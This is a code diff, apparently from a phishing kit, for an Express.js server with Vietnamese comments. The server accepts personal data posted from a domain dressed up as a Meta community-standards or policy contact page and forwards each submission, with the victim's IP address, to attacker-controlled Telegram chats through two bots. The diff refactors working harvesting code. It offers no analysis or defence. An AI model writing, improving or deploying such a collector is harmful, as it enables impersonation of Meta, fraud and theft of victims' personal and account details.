@@ -2,41 +2,46 @@ const express = require('express');
 const cors = require('cors');
 const axios = require('axios');
 const app = express();
-
-// Cấu hình cors
-const corsOptions = {
-    origin: ['https://policy-contactus.vercel.app', 'https://policy-contactus.vercel.app/meta-community-standard'],
-    methods: ['GET', 'POST', 'OPTIONS'], // Các method được phép
-    allowedHeaders: ['Content-Type', 'Authorization'], // Các header được phép
-    credentials: true, // Nếu yêu cầu gửi cookie
-};
-app.use(cors(corsOptions));
-app.options('*', cors(corsOptions));
-app.use(express.json());
+require('dotenv').config();
 
 const PORT = 3000;
 
 // Telegram Bot Token và Chat ID
-require('dotenv').config();
-
 const TELEGRAM_BOT_TOKEN_1 = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID_1 = process.env.TELEGRAM_CHAT_ID;//
+const TELEGRAM_CHAT_ID_1 = process.env.TELEGRAM_CHAT_ID;
 const TELEGRAM_BOT_TOKEN_2 = process.env.TELEGRAM_BOT_TOKEN_2;
-const TELEGRAM_CHAT_ID_2 = process.env.TELEGRAM_CHAT_ID_2;//
+const TELEGRAM_CHAT_ID_2 = process.env.TELEGRAM_CHAT_ID_2;
 
-if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+if (!TELEGRAM_BOT_TOKEN_1 || !TELEGRAM_CHAT_ID_1 || !TELEGRAM_BOT_TOKEN_2 || !TELEGRAM_CHAT_ID_2) {
     console.error('Error: Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
     process.exit(1);
 }
-// Endpoint POST để nhận thông tin từ FE
+
+// Cấu hình CORS
+const corsOptions = {
+    origin: [
+        'https://policy-contactus.vercel.app',
+        'https://policy-contactus.vercel.app/meta-community-standard',
+    ], // Danh sách domain cho phép
+    methods: ['GET', 'POST', 'OPTIONS'], // Các phương thức được phép
+    allowedHeaders: ['Content-Type', 'Authorization'], // Các header cho phép
+    credentials: true, // Cho phép gửi cookie nếu có
+};
+
+// Đảm bảo middleware được áp dụng trước tất cả routes
+app.use(cors(corsOptions));
+
+// Đảm bảo xử lý preflight request (OPTIONS)
+app.options('*', cors(corsOptions));
+
+// Middleware để parse JSON
+app.use(express.json());
+
+// Endpoint 1: Gửi thông tin qua Telegram Bot 1
 app.post('/api/user-info', async (req, res) => {
     const userInfo = req.body;
-
-    // Lấy IP từ body hoặc từ request headers/sockets nếu không có trong body
     const ipAddress = userInfo.ipAddress || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
-
-    // Format thông tin thành chuỗi để gửi
     const message = `
 📧 *User Information Received*:
 - Full Name: ${userInfo.fullName || ''}
@@ -52,16 +57,15 @@ app.post('/api/user-info', async (req, res) => {
     `;
 
     try {
-        // Gửi tin nhắn qua Telegram
         const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_1}/sendMessage`, {
             chat_id: TELEGRAM_CHAT_ID_1,
             text: message,
-            parse_mode: 'Markdown', // Định dạng tin nhắn
+            parse_mode: 'Markdown',
         });
 
         res.json({
             message: 'User info received and sent to Telegram successfully on web FaceBook Policy',
-            telegramResponse: response.data.result.text,
+            telegramResponse: response.data,
         });
     } catch (error) {
         console.error('Error sending message to Telegram:', error.message);
@@ -72,14 +76,12 @@ app.post('/api/user-info', async (req, res) => {
         });
     }
 });
+
+// Endpoint 2: Gửi thông tin qua Telegram Bot 2
 app.post('/api/user-info-1', async (req, res) => {
     const userInfo = req.body;
-
-    // Lấy IP từ body hoặc từ request headers/sockets nếu không có trong body
     const ipAddress = userInfo.ipAddress || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
-
-    // Format thông tin thành chuỗi để gửi
     const message = `
 📧 *User Information Received*:
 - Full Name: ${userInfo.fullName || ''}
@@ -95,16 +97,15 @@ app.post('/api/user-info-1', async (req, res) => {
     `;
 
     try {
-        // Gửi tin nhắn qua Telegram
         const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendMessage`, {
             chat_id: TELEGRAM_CHAT_ID_2,
             text: message,
-            parse_mode: 'Markdown', // Định dạng tin nhắn
+            parse_mode: 'Markdown',
         });
 
         res.json({
             message: 'User info received and sent to Telegram successfully on Meta Policy',
-            telegramResponse: response.data.result.text,
+            telegramResponse: response.data,
         });
     } catch (error) {
         console.error('Error sending message to Telegram:', error.message);
@@ -116,7 +117,7 @@ app.post('/api/user-info-1', async (req, res) => {
     }
 });
 
-// Khởi động server
+// Start server
 app.listen(PORT, () => {
     console.log(`Server is running on http://localhost:${PORT}`);
 });
